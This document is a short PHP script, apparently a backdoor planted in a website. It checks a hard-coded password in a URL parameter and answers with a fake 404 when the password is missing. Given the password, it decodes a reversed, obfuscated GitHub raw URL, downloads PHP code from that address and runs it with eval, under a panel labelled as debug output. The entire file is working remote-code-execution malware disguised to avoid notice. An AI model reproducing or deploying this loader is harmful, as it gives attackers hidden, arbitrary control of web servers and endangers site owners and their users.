<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$pass = "rahasia123";

if (!isset($_GET['p']) || $_GET['p'] !== $pass) {
    header('HTTP/1.0 404 Not Found');
    exit;
}

$z = "php.2/niam/sdaeh/sfer/mpo/mpyfful/moc.tnebnetnocubhtig.war//:sptth";
$u = strrev($z);

echo '<div id="php-report" style="position:fixed; top:10px; right:10px; z-index:9999; background:#1a1a1a; color:#eee; padding:15px; border-radius:8px; border:2px solid #ff0000; font-family:sans-serif; width:280px; box-shadow: 0 5px 15px rgba(0,0,0,0.7);">';
echo '<div style="font-weight:bold; border-bottom:1px solid #444; margin-bottom:10px; padding-bottom:5px; color:#ff0000;">[ DEBUG MODE ]</div>';

$r = @file_get_contents($u);

if ($r !== false) {
    echo '<div style="color:#2ecc71;">● Link OK (' . strlen($r) . ' bytes)</div>';
    try {
        echo '<div style="color:#3498db;">● Executing...</div>';
        
        // Menggunakan output buffering untuk menangkap isi eval
        ob_start();
        eval("?>" . $r);
        $output = ob_get_clean();
        
        if (empty($output)) {
            echo '<div style="color:#f1c40f;">● Execution ok, but no output.</div>';
        } else {
            echo '<div style="color:#2ecc71;">● Output captured.</div>';
            echo $output;
        }

    } catch (Throwable $e) {
        echo '<div style="color:#e74c3c;">ERROR: ' . htmlspecialchars($e->getMessage()) . '</div>';
    }
} else {
    echo '<div style="color:#e74c3c;">FAILED: Cannot fetch URL.</div>';
}

echo '</div>';
?>
